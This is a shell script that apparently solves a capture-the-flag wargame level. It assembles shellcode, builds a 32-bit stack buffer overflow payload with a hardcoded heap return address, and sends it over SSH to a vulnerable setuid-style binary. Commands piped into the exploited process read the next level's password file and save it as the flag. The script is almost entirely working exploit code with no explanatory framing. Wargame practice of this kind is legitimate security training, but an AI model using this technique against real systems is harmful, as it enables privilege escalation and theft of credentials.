#!/usr/bin/env sh

### GLOBALS ###

CURR_DIR_PATH="$(cd "$(dirname "$0")" && pwd)"

### SOURCES ###

. "$CURR_DIR_PATH/../../common/ssh/ssh_session.sh";
. "$CURR_DIR_PATH/.sshid.sh";

# ##### #
# UTILS #
# ##### #

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

# #### #
# MAIN #
# #### #

generate_exploit_shellcode() {
    trap '[ -n "$tmpdir" ] && rm -rf "$tmpdir"' EXIT INT TERM HUP QUIT;
    tmpdir=$(mktemp -d);

    nasm -f elf32 "$CURR_DIR_PATH/data/exploit.asm" -o "$tmpdir/exploit.o" || return 1;
    ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin" || return 1;
    objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin" || return 1;

    shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
    printf "%s" "$shellcode";

    rm -rf "$tmpdir";
    unset tmpdir shellcode;
    return 0;
}

main() {
    flag="";

    log "Authenticating to SSH server at $host:$port with username '$username' and password '$password'...";

    # /!\ In dash `printf` doesn't support the `\xHH` format specifier. So we use octal instead of hexadecimal. /!\
    # 1. Shell code.
    octal_shellcode="$(generate_exploit_shellcode)";
    octal_shellcode_byte_length=$(printf "%b" "$octal_shellcode" | wc -c);
    # 2. Stack local variables filler.
    local_vars_byte_length=$((64 + 4 + 8)); # buffer (64 bytes) + ret_addr (4 bytes) + padding (8 bytes).
    if [ "$octal_shellcode_byte_length" -gt "$local_vars_byte_length" ]; then
        log "Error: shellcode is too long. It must be less than or equal to $local_vars_byte_length bytes, but it is $octal_shellcode_byte_length bytes.";
        return 1;
    fi
    local_vars_filler_length=$((64 + 4 + 8 - octal_shellcode_byte_length)); # buffer (64 bytes) + ret_addr (4 bytes) + padding (8 bytes) - shellcode (octal_shellcode_byte_length bytes).
    local_vars_filler="$(printf "x%.0s" $(seq "$local_vars_filler_length"))";
    # 3. EBP filler.
    ebp_filler="$(printf "b%.0s" $(seq 4))";
    # 4. Return address to the shellcode in the heap.
    heap_ptr_return_addr="\010\240\004\010"; # = 0x804a008 = 4 bytes.;
    # 5. Setup the payload.
    payload="${octal_shellcode}${local_vars_filler}${ebp_filler}${heap_ptr_return_addr}";

    # printf "Payload: %s\n" "$payload";

    log "Authenticating to SSH server at $host:$port with username '$username'...";
    SSHPASS="$(sshid_password)" ssh_initialize_socket "$host" "$port" "$username" || { log "Error: Failed to initialize SSH socket." >&2; return 1; };
    ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt";
    (
        printf '%s' 'sleep 1;'; # Not viable but should workout.
        printf '%s' 'cat '/home/user/level3/.pass' > /tmp/flag.txt;';
    ) | ssh_exec_via_socket "$host" "$port" "$username" "(printf '%b' '$payload\n'; cat -) | ~/level2 >&2";
    flag=$(ssh_exec_via_socket "$host" "$port" "$username" "cat /tmp/flag.txt && rm -f /tmp/flag.txt");
    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket." >&2; return 1; };
    
    if [ -z "$flag" ]; then
        log "Error: flag is empty. Something went wrong.";
        return 1;
    fi

    flag_path="$CURR_DIR_PATH/../flag";
    log "Flag '$flag' has been written to '$flag_path'";
    echo -n "$flag" > "$flag_path";
}

main "$@";
